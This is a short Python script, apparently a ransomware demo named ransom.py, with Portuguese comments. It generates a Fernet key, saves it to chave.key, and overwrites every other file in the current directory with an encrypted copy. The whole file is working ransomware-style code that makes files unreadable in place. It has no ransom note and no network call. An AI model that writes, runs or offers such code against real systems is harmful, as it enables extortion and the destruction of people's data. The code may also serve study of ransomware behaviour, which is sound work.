from importlib.resources import contents
import os
from cryptography.fernet import Fernet

'''Criptografa os arquivos '''

files = []
key = Fernet.generate_key()

with open('chave.key', 'wb') as chave:
    chave.write(key)

for file in os.listdir():
    if file == 'ransom.py' or file == 'chave.key':
        continue
    if os.path.isfile(file):
        files.append(file)

for file in files:
    with open(file, 'rb') as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = Fernet(key).encrypt(conteudo)
    with open(file, 'wb') as arquivo:
        arquivo.write(conteudo_encrypted)
